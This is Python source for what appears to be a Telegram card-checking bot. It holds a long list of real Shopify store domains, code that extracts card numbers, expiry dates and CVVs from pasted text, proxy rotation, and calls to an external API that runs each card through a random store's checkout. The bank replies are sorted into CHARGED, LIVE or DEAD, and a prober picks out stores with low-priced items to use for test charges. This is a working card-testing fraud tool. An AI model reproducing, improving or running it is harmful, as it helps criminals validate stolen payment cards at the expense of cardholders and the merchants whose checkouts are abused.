    "green-chapter-shop.myshopify.com",
    "bradawheels.myshopify.com",
    "mother-meera-bookstore-usa.myshopify.com",
    "green-mountain-adventure-middlebury-mountaineer.myshopify.com",
    "hgvn01-ex.myshopify.com",
    "maker-valley.myshopify.com",
    "thejnfstore.myshopify.com",
    "themedicallounge.myshopify.com",
    "mastersons-garden-center-inc.myshopify.com",
    "budget-conscious-shopper.myshopify.com",
    "curlsmith.com",
    "thecraftboxuk.myshopify.com",
    "nextgencollect.myshopify.com",
    "inside-stores-2.myshopify.com",
    "glo-brights-wonder-emporium.myshopify.com",
    "jacksonlakewy-store.myshopify.com",
    "mp484e-aa.myshopify.com",
    "storeyfamilyfarm.com",
    "lapf.myshopify.com",
    "vintagepostage.myshopify.com",
    "sweet-p-6471.myshopify.com",
    "alharamain-perfumes.myshopify.com",
    "soapbodega.myshopify.com",
    "shop-plasticplace.myshopify.com",
    "autopints.myshopify.com",
    "vegnews.myshopify.com",
    "kripsy-kat.myshopify.com",
    "lit3456.myshopify.com",
    "the-childrens-school-atl.myshopify.com",
    "turquoise-gem-textiles.myshopify.com",
    "darkenergy.com",
    "simplygoodhl.myshopify.com",
    "organized-chaos-hq.myshopify.com",
    "ysolda.com",
    "10wzei-2a.myshopify.com",
    "guardian-bleeding-control.myshopify.com",
    "renardhomestore.myshopify.com",
    "bethanyjoyart.com",
    "louisianatrophies.com",
    "rockin-c-silver-co.myshopify.com",
    "dev-cmt.myshopify.com",
    "built-bar.myshopify.com",
    "xwpfns-et.myshopify.com",
    "elmos3d-2.myshopify.com",
    "shadow-fashion-clothing.myshopify.com",
    "6815ir-tv.myshopify.com",
    "j-j-general-goods.myshopify.com",
    "rutland-tile-stone.myshopify.com"
]

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RESPONSE CLASSIFICATION  — exact match to msh.py logic
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RETRY_ERRORS = site/infrastructure errors → skip this site, try another
# These are NOT bank responses — the site itself is broken/unsupported.
RETRY_ERRORS = [
    'r4 token empty', 'payment method is not shopify!', 'r2 id empty',
    'product not found', 'hcaptcha detected', 'tax ammount empty',
    'del ammount empty', 'product id is empty', 'py id empty',
    'clinte token', 'hcaptcha_detected', 'receipt_empty', 'na', 'DELIVERY_ZONE_NOT_FOUND',
    'site error! status: 429', 'site requires login!', 'failed to get token',
    'no valid products', 'not shopify!', 'site not supported for now!', 'VALIDATION_CUSTOM',
    'connection error', 'connection error!', 'error processing card',
    '504', 'server error', 'client error', 'failed', 'BUYER_IDENTITY_CURRENCY_NOT_SUPPORTED_BY_SHOP',
    'token not found', 'invalid_response', 'resolve', 'item', 'curl error',
    'PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED', 'could not resolve host',
    'connect tunnel failed', 'timeout', 'proxy error',
    'step 0 failed', 'step 1 failed', 'step 2 failed', 'step 3 failed',
    'step 4 failed', 'step 5 failed', 'step 6 failed', 'step 7 failed',
    'step 8 failed', 'step 9 failed', 'step 10 failed',
    'SESSION_ERROR', 'DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE',
    'DELIVERY_ZONE_NOT_FOUND', 'DELIVERY_DELIVERY_LINE_DETAIL_CHANGED',
    'DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE_FOR_MERCHANDISE_LINE',
    'DELIVERY_STRATEGY_CONDITIONS_NOT_SATISFIED',
    'no available products found', 'could not extract receiptid',
    'BUYER_IDENTITY_MARKETING_CONSENT_PHONE_NUMBER_DOES_NOT_MATCH_EXPECTED_PATTERN',
    'could not extract signedhandles', 'receiptid missing',
    'response missing receiptid', 'INVENTORY_FAILURE',
    'products.json', 'returned status 429', 'returned status 500',
    'returned status 502', 'returned status 503', 'returned status 504',
    'store incompatible', 'extract signedHandles', 'missing receiptId',
    'NO_PRODUCTS', 'NO_PRODUCT', 'VAULT_FAILED', 'MERCHANDISE_OUT_OF_STOCK',
    'site error! status: 404', 'site error! status: 500', 'site error! status: 402',
    'site error! status: 502', 'site error! 503', 'site error! status: 503',
    'site error! status: 403', 'site error! status: 401',
    'site not supported for now!', 'site not supported', 'site error',
    'failed to get checkout', 'failed to add to cart', 'site overloaded', 'site rate limited',
    'delivery_delivery_line_detail_changed', 'failed to get session token',
    'unable to get payment token', 'validation_custom', 'http error',
    'missing stableid', 'missing buildid', 'missing sourcetoken', 'checkout_failed',
    'delivery_out_of_stock_at_origin_location',
    'could not extract private_access_token', 'no_products',
    'buyer_identity_currency_not_supported_by_shop',
    'could not find actions js url', 'session_error', 'delivery_zone_not_found',
    'missing proposal', 'missing submit id', 'delivery_strategy_conditions_not_satisfied',
    'retryable: inventory reservation failure', 'inventory_failure',
    'exceeded 30 poll attempts',
    'delivery_no_delivery_strategy_available_for_merchandise_line',
    'could not extract queuetoken', 'delivery_no_delivery_strategy_available',
    'could not extract identification signature',
    'could not extract session id', 'payments_credit_card_brand_not_supported',
    'could not extract delivery handle', 'could not extract signedhandles',
    'could not extract shipping amount', 'could not extract total amount',
    'could not extract sessiontoken', 'errstoreincompatible', 'errmissingreceiptid',
    'application not found', 'store not found', 'app not found',
]

# DECLINED_RESPONSES = real bank hard-decline → card is dead, stop checking
DECLINED_RESPONSES = [
    'CARD_DECLINED', 'PROCESSING_ERROR', 'GENERIC_DECLINE',
    'DO NOT HONOR', 'DO_NOT_HONOR', 'UNKNOWN_ERROR', 'Processing Error',
    'PICK_UP_CARD', 'DECISION_RULE_BLOCK', 'FRAUD_SUSPECTED',
    'INVALID_PURCHASE_TYPE', 'INVALID_PAYMENT_METHOD', 'TEST_MODE_LIVE_CARD',
    'AMOUNT_TOO_SMALL', 'INCORRECT_NUMBER', 'EXPIRED_CARD',
    'CALL_ISSUER', 'STOLEN_CARD', 'LOST_CARD', 'RESTRICTED_CARD',
    'TRANSACTION_NOT_ALLOWED',
]

# Keep old names as aliases so probe functions still work
DEAD_ERRORS     = RETRY_ERRORS
SUCCESS_RESPONSES = [
    'CARD_DECLINED', 'INVALID_CVC', 'INCORRECT_CVV', 'INSUFFICIENT_FUNDS',
    'GENERIC_ERROR', 'GENERIC_DECLINE', 'DO NOT HONOR', 'UNKNOWN_ERROR',
    'Processing Error', 'EXPIRED_CARD', 'PICK_UP_CARD', 'DECISION_RULE_BLOCK',
    'FRAUD_SUSPECTED', '3DS_REQUIRED', 'AMOUNT_TOO_SMALL',
    'INVALID_PURCHASE_TYPE', 'INVALID_PAYMENT_METHOD', 'INCORRECT_NUMBER',
    'DO_NOT_HONOR', 'INCORRECT_CVC', 'INVALID_CVC', 'SECURITY_VIOLATION',
    'TRANSACTION_NOT_ALLOWED', 'RESTRICTED_CARD', 'STOLEN_CARD', 'LOST_CARD',
    'CALL_ISSUER', 'TEST_MODE_LIVE_CARD', 'PROCESSING_ERROR',
    '3D_SECURE', '3DS', 'AUTHENTICATION_REQUIRED', 'SCA_REQUIRED',
    'ORDER_PAID', 'PAYMENT_AUTHORIZED', 'PAYMENT_ACCEPTED', 'CHARGED', 'APPROVED',
]


def _is_dead_site_response(resp: str) -> bool:
    """True if the response is a site/infrastructure error (should retry another site)."""
    r = resp.lower().strip()
    return any(err.lower() in r for err in RETRY_ERRORS)


def _is_success_response(resp: str) -> bool:
    """True if the response is a real bank response (site is alive)."""
    ru = resp.upper().strip()
    return any(s.upper() in ru for s in SUCCESS_RESPONSES)


def classify_response(resp: str) -> str:
    """
    Classify API response — exact msh.py logic.
    Returns: CHARGED | TDS | LIVE | DEAD | RETRY | ERROR
      CHARGED/TDS/LIVE/DEAD → stop checking this card (final verdict)
      RETRY                 → site/infra error, try a different site
      ERROR                 → unknown response, try a different site
    """
    if not resp:
        return "RETRY"
    mu = resp.upper().strip()
    ml = resp.lower().strip()

    # ── CHARGED (real money moved) ───────────────────────────────────────────
    if "ORDER_PAID" in mu or "CHARGED" in mu:
        return "CHARGED"

    # ── TDS (3-D Secure redirect) ────────────────────────────────────────────
    if "3DS_REQUIRED" in mu:
        return "TDS"

    # ── LIVE (card valid — bank gave a real soft-decline) ───────────────────
    if ("INSUFFICIENT_FUNDS" in mu or "INCORRECT_CVV" in mu
            or "INCORRECT_CVC" in mu or "INCORRECT_ZIP" in mu):
        return "LIVE"

    # ── DEAD (bank hard-declined — card is genuinely bad) ───────────────────
    if "GENERIC_ERROR" in mu:
        return "DEAD"
    if any(d.upper() in mu for d in DECLINED_RESPONSES):
        return "DEAD"

    # ── RETRY (site/infra error — try a different site) ─────────────────────
    if any(r.lower() in ml for r in RETRY_ERRORS):
        return "RETRY"

    # Unknown — try another site
    return "ERROR"


def _clean_resp(resp: str) -> str:
    """For display only — make site errors human-readable."""
    if not resp:
        return "Dead"
    r = resp.lower()
    if "site error!" in r or "site error" in r:
        m = re.search(r"status:\s*(\d+)", r)
        if m:
            code = int(m.group(1))
            return "Dead" if code in (404, 403, 401) else f"Server Error {code}"
        return "Server Error"
    if "not shopify" in r or "site not supported" in r:
        return "Dead"
    if "connection error" in r or "could not resolve" in r:
        return "Connection Error"
    if "timeout" in r:
        return "Timeout"
    return resp


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# LOADERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _strip_proxy_scheme(p: str) -> str:
    for pfx in ("socks5://", "socks4://", "https://", "http://"):
        if p.startswith(pfx):
            return p[len(pfx):]
    return p


def _load_proxies() -> list:
    global _ALL_PROXIES
    import os
    for fname in ("px.txt", "proxies.txt"):
        for base in ("", "..", os.path.dirname(os.path.abspath(__file__))):
            path = os.path.join(base, fname) if base else fname
            try:
                with open(path, encoding="utf-8", errors="ignore") as f:
                    raw = [l.strip() for l in f
                           if l.strip() and not l.startswith(("#", "//", ";"))]
                if raw:
                    lines = [_strip_proxy_scheme(p) for p in raw]
                    _ALL_PROXIES = lines
                    logging.info(f"[SH] {len(lines)} proxies from {path}")
                    return lines
            except (FileNotFoundError, PermissionError):
                pass
    logging.warning("[SH] No proxy file found — add px.txt with ip:port lines")
    _ALL_PROXIES = []
    return []


def _strip_scheme(url: str) -> str:
    url = url.strip()
    for pfx in ("https://", "http://", "www."):
        if url.startswith(pfx):
            url = url[len(pfx):]
    return url.rstrip("/")


def _load_sites() -> list:
    """
    Try to load sites.txt from disk (so the user can update it without
    redeploying). Falls back to BUILTIN_SITES (672 sites from sites.txt
    embedded at build time) if the file is not found or is empty.
    """
    import os
    for base in ("", "..", os.path.dirname(os.path.abspath(__file__))):
        path = os.path.join(base, "sites.txt") if base else "sites.txt"
        try:
            with open(path, encoding="utf-8", errors="ignore") as f:
                lines = [_strip_scheme(l) for l in f
                         if l.strip() and not l.startswith("#")]
            lines = [l for l in lines if l]
            if lines:
                result = list(lines)
                random.shuffle(result)
                logging.info(f"[SH] {len(result)} sites from {path}")
                return result
        except (FileNotFoundError, PermissionError):
            pass
    # Fallback: use sites embedded directly in this file
    result = list(BUILTIN_SITES)
    random.shuffle(result)
    logging.info(f"[SH] Using {len(result)} built-in sites (sites.txt not found)")
    return result


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SITE PROBER  — finds which sites the API actually supports
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def _probe_one_site(site: str, proxies: list) -> bool:
    """
    Return True if this site is alive and usable for real card checks.
    Uses the same criteria as sitechk.py:
      1. Gateway must be "SHOPIFY PAYMENTS"
      2. Response must be in SUCCESS_RESPONSES (real bank decline)
      3. Price must be $0.50–$6.00  (too low = store blocks test; too high = risky)
      4. ORDER_PAID on probe card = block (don't want accidental charges)
    """
    MAX_PROBE_RETRIES = 3
    for attempt in range(MAX_PROBE_RETRIES):
        px = random.choice(proxies) if proxies else None
        try:
            resp, gw, price, currency, http_st = await _call_api(
                PROBE_CARD, site, px, timeout=PROBE_TIMEOUT
            )
        except Exception:
            await asyncio.sleep(0.3)
            continue

        # HTTP errors → dead
        if http_st and http_st not in (200,):
            return False

        # Gateway MUST be Shopify Payments
        if gw.upper().strip() != "SHOPIFY PAYMENTS":
            return False

        resp_upper = resp.upper().strip()

        # ORDER_PAID on probe card = site actually charged test card → block
        if "ORDER_PAID" in resp_upper or resp_upper == "PAID":
            logging.warning(f"[PROBE] BLOCKED {site}: ORDER_PAID on test card")
            return False

        # Dead-site error → this site is broken, try again with different proxy
        if _is_dead_site_response(resp):
            await asyncio.sleep(0.3)
            continue

        # Real bank response → site is alive!
        # Price constraint: reject only absurd amounts (>$20) to avoid accidental charges
        if _is_success_response(resp):
            try:
                p = float(re.sub(r"[^\d.]", "", str(price)))
                if p > 20.0:
                    logging.debug(f"[PROBE] ❌ {site} price ${p:.2f} too high, blocked")
                    return False
            except Exception:
                pass  # Can't parse price — accept anyway
            logging.info(f"[PROBE] ✅ {site} alive: {resp!r} price={price}")
            return True

        # Unknown response → try another attempt
        await asyncio.sleep(0.2)
        continue

    return False


async def probe_all_sites(all_sites: list, proxies: list,
                          on_progress=None) -> list:
    """
    Test every site concurrently. Returns confirmed-working sites.
    Falls back to all_sites if nothing is alive.
    on_progress(done, total) is called every 50 sites if provided.
    """
    global _WORKING_SITES, _PROBE_IN_PROGRESS, _PROBE_LAST_RUN

    if _PROBE_IN_PROGRESS:
        logging.info("[PROBE] already running — skipping duplicate call")
        return _WORKING_SITES or all_sites

    _PROBE_IN_PROGRESS = True
    logging.info(f"[PROBE] Starting: {len(all_sites)} sites, "
                 f"{len(proxies)} proxies, concurrency={PROBE_CONCURRENCY}")

    sem     = asyncio.Semaphore(PROBE_CONCURRENCY)
    working = []
    done_n  = 0
    total   = len(all_sites)

    async def _check_one(site):
        nonlocal done_n
        async with sem:
            result = await _probe_one_site(site, proxies)
            done_n += 1
            if result:
                working.append(site)
            if on_progress and done_n % 50 == 0:
                try:
                    await on_progress(done_n, total)
                except Exception:
                    pass

    try:
        await asyncio.gather(*[_check_one(s) for s in all_sites],
                             return_exceptions=True)
    finally:
        _PROBE_IN_PROGRESS = False

    if working:
        random.shuffle(working)
        _WORKING_SITES  = working
        _PROBE_LAST_RUN = time.time()
        logging.info(f"[PROBE] ✅ {len(working)}/{total} sites alive")
    else:
        logging.warning("[PROBE] ⚠️ 0 working sites found — "
                        "keeping previous cache or using full list")
        if not _WORKING_SITES:
            _WORKING_SITES = list(all_sites)

    return _WORKING_SITES


def get_working_sites() -> list:
    """Return probed working sites, or the full list if probe hasn't run."""
    return list(_WORKING_SITES) if _WORKING_SITES else _load_sites()


async def _auto_probe_loop(all_sites: list, proxies: list):
    """Background loop: probe now, then re-probe every PROBE_TTL seconds."""
    await asyncio.sleep(5)          # let bot finish startup first
    while True:
        try:
            await probe_all_sites(all_sites, proxies)
        except Exception as exc:
            logging.error(f"[PROBE] background error: {exc}")
        await asyncio.sleep(PROBE_TTL)


def start_probe_background(all_sites: list, proxies: list):
    """Schedule the background probe loop. Call once from _post_init."""
    asyncio.ensure_future(_auto_probe_loop(all_sites, proxies))


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CARD UTILITIES
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def luhn_check(n: str) -> bool:
    n = str(n).strip()
    if not n.isdigit(): return False
    t = 0
    for i, c in enumerate(n[::-1]):
        d = int(c)
        if i % 2 == 1:
            d *= 2
            if d > 9: d -= 9
        t += d
    return t % 10 == 0


def is_expired(mm: str, yy: str) -> bool:
    try:
        now = datetime.now()
        ey, em = int(yy), int(mm)
        if ey < now.year % 100: return True
        if ey == now.year % 100 and em < now.month: return True
        return False
    except ValueError:
        return True


def extract_cards(text: str) -> list:
    patterns = [
        r'(\d{13,19})\s*[|/:=]\s*(\d{1,2})\s*[|/:=]\s*(\d{2,4})\s*[|/:=]\s*(\d{3,4})',
        r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
    ]
    seen, results = set(), []
    for pat in patterns:
        for m in re.findall(pat, text):
            cc, mm, yy, cvv = m
            mm = mm.zfill(2)
            if len(yy) == 4: yy = yy[2:]
            s = f"{cc}|{mm}|{yy}|{cvv}"
            if s not in seen:
                seen.add(s); results.append(s)
    return results


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# API CALL
# f-string URL keeps | chars unencoded (aiohttp params= encodes them)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _parse_response_field(data: dict) -> str:
    for key in ("Response", "response", "message", "Message",
                "error", "Error", "status", "Status",
                "result", "Result", "msg"):
        val = data.get(key)
        if val and str(val).strip():
            return str(val).strip()
    return "Unknown Error"


def _proxy_url(proxy: Optional[str]) -> Optional[str]:
    """Ensure proxy has http:// prefix as required by the new API."""
    if not proxy:
        return None
    p = proxy.strip()
    if p.startswith(("http://", "https://", "socks5://", "socks4://")):
        return p
    return f"http://{p}"


async def _call_api(card: str, site: str, proxy: Optional[str],
                    timeout: float = SITE_TIMEOUT) -> tuple:
    # New API: ?cc=NUM|MM|YY|CVV&site=https://DOMAIN&proxy=http://ip:port
    site_clean = _strip_scheme(site)          # remove any existing scheme first
    site_url   = f"https://{site_clean}"      # add https:// as new API requires
    px         = _proxy_url(proxy)
    url = (f"{API_URL}?cc={card}&site={site_url}&proxy={px}"
           if px else f"{API_URL}?cc={card}&site={site_url}")
    # connect=3 so dead/hung sites fail in 3s not 12s
    _to  = aiohttp.ClientTimeout(total=timeout, connect=3, sock_read=timeout)
    try:
        async with aiohttp.ClientSession(timeout=_to) as session:
            async with session.get(url, ssl=False) as r:
                http_st = r.status
                raw     = await r.text()
                # Empty body = API couldn't reach the store → treat as 404
                if not raw or not raw.strip():
                    return ("site error! status: 404",
                            "Shopify Payments", "0.00", "USD", http_st)
                if http_st == 200:
                    try:
                        data = _json.loads(raw)
                    except Exception:
                        return ("site error! status: 404",
                                "Shopify Payments", "0.00", "USD", http_st)
                    gw       = str(data.get("Gateway")  or data.get("gateway")  or "Shopify Payments")
                    price    = str(data.get("Price")     or data.get("price")    or "0.00")
                    currency = str(data.get("Currency")  or data.get("currency") or "USD")
                    api_resp = _parse_response_field(data)
                    logging.info(f"[API] {card[:6]}** {site} → {api_resp!r}")
                    return api_resp, gw, price, currency, http_st
                _emap = {
                    404: "site error! status: 404",
                    403: "site error! status: 403",
                    429: "site error! status: 429",
                    500: "site error! status: 500",
                    502: "site error! status: 500",
                    503: "site error! status: 500",
                    504: "timeout",
                }
                return (_emap.get(http_st, f"HTTP Error {http_st}"),
                        "Shopify Payments", "0.00", "USD", http_st)
    except asyncio.TimeoutError:
        return ("timeout", "Shopify Payments", "0.00", "USD", None)
    except asyncio.CancelledError:
        raise
    except Exception as e:
        return (f"connection error: {str(e)[:60]}", "Shopify Payments", "0.00", "USD", None)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CORE RETRY LOOP
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def _check_card_with_retry(
    _session,
    card: str,
    sites: list,
    proxies: list,
    max_sites: int      = SITE_RETRIES,
    site_timeout: float = SITE_TIMEOUT,
    sid: str            = "",
) -> tuple:
    """
    Try up to max_sites Shopify stores for this card.

    Decision tree per attempt:
      1. HTTP non-200                  → skip site (add to local dead)
      2. Rate-limited (429)            → sleep 3-5s, retry same site
      3. Response in DEAD_ERRORS       → skip site (infrastructure error, not a bank response)
      4. Response in SUCCESS_RESPONSES → REAL bank response → classify card → return
      5. Unknown response              → skip site

    Returns: (verdict, raw_resp, price, currency)
      verdict: CHARGED | TDS | LIVE | DEAD
    """
    if not sites:
        sites = get_working_sites()
        if not sites:
            sites = list(BUILTIN_SITES)

    # Per-card local dead set only — each card tries sites independently.
    # We intentionally do NOT share the global _DEAD_SITES here so that
    # parallel cards don't block each other from trying the same sites.
    local_dead: set = set()

    # Shuffle a fresh copy of the site pool for this card
    pool    = list(sites)
    random.shuffle(pool)
    px_pool = list(proxies) if proxies else list(_ALL_PROXIES)
    tried: set        = set()
    price, currency = "0.00", "USD"
    last_resp       = "No sites responded"

    for attempt in range(max_sites):

        # ── Stop signal (mass check) ──────────────────────────────────
        if sid and MSH_SESSIONS.get(sid, {}).get("status") == "STOPPED":
            raise asyncio.CancelledError()

        # ── Pick next untried site for THIS card ──────────────────────
        skip      = tried | local_dead
        available = [s for s in pool if s not in skip]
        if not available:
            # Tried everything in pool once — reset and go again
            local_dead.clear()
            tried.clear()
            pool      = list(sites)
            random.shuffle(pool)
            available = pool[:]

        site  = random.choice(available)
        tried.add(site)
        proxy = random.choice(px_pool) if px_pool else None

        # ── API call ──────────────────────────────────────────────────
        try:
            resp, gw, price, currency, http_st = await _call_api(
                card, site, proxy, timeout=site_timeout
            )
        except asyncio.CancelledError:
            raise
        except Exception as exc:
            logging.debug(f"[SH] {card[:6]}** {site} exception: {exc}")
            local_dead.add(site)
            continue

        logging.info(f"[API] {card[:6]}** #{attempt+1}/{max_sites} "
                     f"site={site} proxy={proxy or 'none'} → {resp!r}")

        # ── 1. HTTP-level error ───────────────────────────────────────
        if http_st and http_st not in (200,):
            local_dead.add(site)
            last_resp = f"HTTP {http_st}"
            continue

        # ── 2. Rate limited ───────────────────────────────────────────
        if http_st == 429 or (resp and "status: 429" in resp.lower()):
            tried.discard(site)
            await asyncio.sleep(random.uniform(2.0, 4.0))
            continue

        # ── 3. Classify response — exact msh.py logic ────────────────
        classification = classify_response(resp)
        last_resp      = resp

        logging.info(f"[RESULT] {card[:6]}** #{attempt+1}/{max_sites} "
                     f"→ {classification}  resp={resp!r}  site={site}")

        # CHARGED / TDS / LIVE / DEAD → final verdict, stop immediately
        if classification in ("CHARGED", "TDS", "LIVE", "DEAD"):
            return classification, resp, price, currency

        # RETRY / ERROR → site is broken, try a different site
        local_dead.add(site)
        if classification == "RETRY":
            logging.debug(f"[SH] RETRY site error: {site} → {resp!r}")
        else:
            logging.debug(f"[SH] ERROR unknown resp: {site} → {resp!r}")
        continue

    # ── All attempts exhausted ────────────────────────────────────────
    logging.warning(f"[SH] {card[:6]}** exhausted {max_sites} sites  last={last_resp!r}")
    return "DEAD", last_resp, price, currency


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MISC HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _te(eid: str, fb: str = "●") -> str:
    return f'<tg-emoji emoji-id="{eid}">{fb}</tg-emoji>'


def _u16len(s: str) -> int:
    """UTF-16 code-unit length — what Telegram uses for entity offsets."""
    return len(s.encode("utf-16-le")) // 2


def html_to_entities(html: str):
    """
    Convert sh.py-style HTML into (plain_text, entities).

    This is the ONLY reliable way to send custom emoji stickers in PTB.
    Sending <tg-emoji> via parse_mode="HTML" often falls back to the
    plain-text fallback character; injecting MessageEntity objects directly
    guarantees animated premium stickers display for ALL users.

    Handles: <b>  <code>  <a href="...">  <tg-emoji emoji-id="...">
    Decodes: &lt;  &gt;  &amp;  &quot;
    Entities may overlap (e.g. bold + custom_emoji on the same glyph).
    """
    text     = ""
    entities = []
    stack    = []        # [{name, offset, url?}]
    i        = 0
    n        = len(html)

    while i < n:
        ch = html[i]

        # ── HTML tag ────────────────────────────────────────────────────────
        if ch == "<":
            j   = html.index(">", i)
            tag = html[i + 1 : j]

            # Closing tag
            if tag.startswith("/"):
                tag_name = tag[1:].strip().lower()
                for k in range(len(stack) - 1, -1, -1):
                    if stack[k]["name"] == tag_name:
                        entry  = stack.pop(k)
                        start  = entry["offset"]
                        end    = _u16len(text)
                        length = end - start
                        if length > 0:
                            if tag_name == "b":
                                entities.append(MessageEntity(
                                    type="bold", offset=start, length=length))
                            elif tag_name == "code":
                                entities.append(MessageEntity(
                                    type="code", offset=start, length=length))
                            elif tag_name == "a":
                                entities.append(MessageEntity(
                                    type="text_link", offset=start,
                                    length=length, url=entry.get("url", "")))
                        break
                i = j + 1

            # <tg-emoji emoji-id="...">FALLBACK</tg-emoji>  — handled inline
            elif tag.lower().startswith("tg-emoji"):
                m = re.search(r'emoji-id="([^"]+)"', tag)
                if m:
                    emoji_id  = m.group(1)
                    close_idx = html.index("</tg-emoji>", j + 1)
                    fallback  = html[j + 1 : close_idx]
                    offset    = _u16len(text)
                    text     += fallback
                    length    = _u16len(fallback)
                    if length > 0:
                        entities.append(MessageEntity(
                            type="custom_emoji", offset=offset,
                            length=length, custom_emoji_id=emoji_id))
                    i = close_idx + len("</tg-emoji>")
                else:
                    i = j + 1

            # Opening tag
            else:
                tag_name = tag.split()[0].lower() if tag else ""
                entry    = {"name": tag_name, "offset": _u16len(text)}
                if tag_name == "a":
                    m = re.search(r'href=["\']([^"\']+)["\']', tag)
                    if m:
                        entry["url"] = m.group(1)
                stack.append(entry)
                i = j + 1

        # ── HTML entity escapes ─────────────────────────────────────────────
        elif ch == "&":
            if   html[i:i+4] == "&lt;":  text += "<"; i += 4
            elif html[i:i+4] == "&gt;":  text += ">"; i += 4
            elif html[i:i+5] == "&amp;": text += "&"; i += 5
            elif html[i:i+6] == "&quot;":text += '"'; i += 6
            else:                        text += ch;  i += 1

        # ── Plain text ──────────────────────────────────────────────────────
        else:
            text += ch
            i    += 1

    return text, entities if entities else None


def _send_ents(html: str):
    """Return (plain_text, entities_or_None) from an HTML string."""
    return html_to_entities(html)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# DIRECT MESSAGE ENTITY BUILDER
# Builds Telegram messages with entities directly — ZERO HTML involved.
# This is the only guaranteed way to show animated custom emoji stickers
# for ALL users in python-telegram-bot.  No HTML → entities conversion
# required; MessageEntity objects are injected straight into the API call.
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class MsgBuilder:
    """Fluent builder that accumulates plain text + MessageEntity objects."""
    __slots__ = ("_txt", "_ents")

    def __init__(self):
        self._txt  = ""
        self._ents = []

    @staticmethod
    def _u16(s: str) -> int:
        """UTF-16 code-unit length — what Telegram uses for entity offsets."""
        return len(s.encode("utf-16-le")) // 2

    # ── primitive appenders ──────────────────────────────────────────────
    def raw(self, s: str) -> "MsgBuilder":
        if s: self._txt += s
        return self

    def bold(self, s: str) -> "MsgBuilder":
        if not s: return self
        o = self._u16(self._txt); l = self._u16(s); self._txt += s
        if l: self._ents.append(MessageEntity(type="bold", offset=o, length=l))
        return self

    def code(self, s: str) -> "MsgBuilder":
        if not s: return self
        o = self._u16(self._txt); l = self._u16(s); self._txt += s
        if l: self._ents.append(MessageEntity(type="code", offset=o, length=l))
        return self

    def link(self, display: str, url: str) -> "MsgBuilder":
        if not display: return self
        o = self._u16(self._txt); l = self._u16(display); self._txt += display
        if l: self._ents.append(MessageEntity(type="text_link", offset=o, length=l, url=url))
        return self

    def emoji(self, eid: str, fb: str) -> "MsgBuilder":
        """Animated custom emoji sticker inline (no bold wrapper)."""
        if not fb: return self
        o = self._u16(self._txt); l = self._u16(fb); self._txt += fb
        if l: self._ents.append(
            MessageEntity(type="custom_emoji", offset=o, length=l, custom_emoji_id=eid))
        return self

    def bold_emoji(self, eid: str, fb: str) -> "MsgBuilder":
        """Bold text + animated custom emoji sticker overlapped on the same glyph."""
        if not fb: return self
        o = self._u16(self._txt); l = self._u16(fb); self._txt += fb
        if l:
            self._ents.append(MessageEntity(type="bold", offset=o, length=l))
            self._ents.append(MessageEntity(
                type="custom_emoji", offset=o, length=l, custom_emoji_id=eid))
        return self

    def bold_link(self, display: str, url: str) -> "MsgBuilder":
        """Bold + hyperlink on the same text."""
        if not display: return self
        o = self._u16(self._txt); l = self._u16(display); self._txt += display
        if l:
            self._ents.append(MessageEntity(type="bold",      offset=o, length=l))
            self._ents.append(MessageEntity(type="text_link", offset=o, length=l, url=url))
        return self

    def nl(self, n: int = 1) -> "MsgBuilder":
        self._txt += "\n" * n
        return self

    # ── finalise ─────────────────────────────────────────────────────────
    def build(self):
        """Return (plain_text, entities_or_None) ready for send_message/edit_text."""
        return self._txt, self._ents if self._ents else None


def _uname(user) -> str:
    """Plain display name (no HTML)."""
    return getattr(user, "first_name", None) or "User"


def _uurl(user) -> str:
    """Telegram profile URL."""
    if getattr(user, "username", None):
        return f"https://t.me/{user.username}"
    return f"tg://user?id={user.id}"


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# STICKER RESOLVER  —  the ONLY approach that works for ALL
# users regardless of whether the bot has Telegram Premium.
#
# custom_emoji entities in text messages only display as
# animated stickers when the BOT ACCOUNT has Premium.
# Without Premium the fallback glyph (plain "💎") shows instead.
#
# Bot API getCustomEmojiStickers() + send_sticker() requires NO
# Premium on the bot — the sticker is delivered full-size and
# animated for every user on every client version.
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
_STICKER_CACHE: dict[str, str] = {}    # emoji_id  →  sticker file_id


async def _get_sticker_fid(bot, emoji_id: str):
    """Resolve a custom emoji ID to a sendable sticker file_id (in-process cache).
    Returns the file_id string, or None if the API call fails."""
    if emoji_id in _STICKER_CACHE:
        return _STICKER_CACHE[emoji_id]
    try:
        stickers = await bot.get_custom_emoji_stickers([emoji_id])
